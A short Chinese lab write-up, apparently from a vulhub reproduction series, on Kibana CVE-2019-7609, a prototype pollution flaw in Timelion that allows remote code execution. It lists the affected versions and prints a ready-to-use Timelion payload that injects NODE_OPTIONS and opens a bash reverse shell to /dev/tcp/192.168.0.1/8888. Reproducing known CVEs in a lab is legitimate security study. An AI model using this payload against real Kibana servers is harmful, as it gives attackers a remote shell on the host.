# Kibana原型污染导致远程执行代码（CVE-2019-7609）

###### by ADummy

### 0x00利用路线

​			

### 0x01漏洞介绍

​			Kibana是Elasticsearch的开源数据可视化仪表板。

5.6.15和6.6.1之前的Kibana版本在Timelion可视化工具中包含任意代码执行缺陷。有权访问Timelion应用程序的攻击者可以发送将尝试执行javascript代码的请求。这可能导致攻击者在主机系统上以Kibana进程的权限执行任意命令。

影响版本

```
Kibana <= 5.6.15
Kibana <= 6.6.1
```

### 0x02漏洞复现

在设置环境之前，您需要`vm.max_map_count`在主机服务器（而不是在Docker容器中）更改为大于262144：

```
sysctl -w vm.max_map_count=262144
```

启动环境后，Kibana正在监听`http://your-ip:5106`。原型污染发生在时间轴可视化器中，在此处填写以下有效负载：

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("/bin/bash -i >& /dev/tcp/192.168.0.1/8888 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

![Kibana_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Kibana_RCE_1.jpg)



![Kibana_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Kibana_RCE_2.jpg)











